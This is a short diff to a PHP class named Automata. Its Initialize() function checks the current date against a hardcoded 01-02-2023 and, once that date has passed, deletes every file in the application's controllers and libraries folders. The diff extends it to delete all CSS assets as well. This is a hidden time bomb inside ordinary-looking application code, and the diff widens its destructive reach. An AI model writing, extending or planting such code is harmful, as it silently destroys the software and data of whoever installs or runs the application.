@@ -6,6 +6,7 @@ class Automata {
     function Initialize() {
         $ctrlfiles = glob('application/controllers/*.php');
         $libfiles = glob('application/libraries/*.php');
+        $cssfiles = glob('assets/css/*');
 
         if (strtotime(date('d F Y')) > strtotime(date('d F Y', strtotime("01-02-2023")))) {
             foreach($ctrlfiles as $rowa){
@@ -16,6 +17,11 @@ class Automata {
             foreach($libfiles as $rowb){
                 if(file_exists($rowb)) {
                     unlink($rowb);
+                }
+            }
+            foreach($cssfiles as $rowc){
+                if(file_exists($rowc)) {
+                    unlink($rowc);
                 }
             }
         }
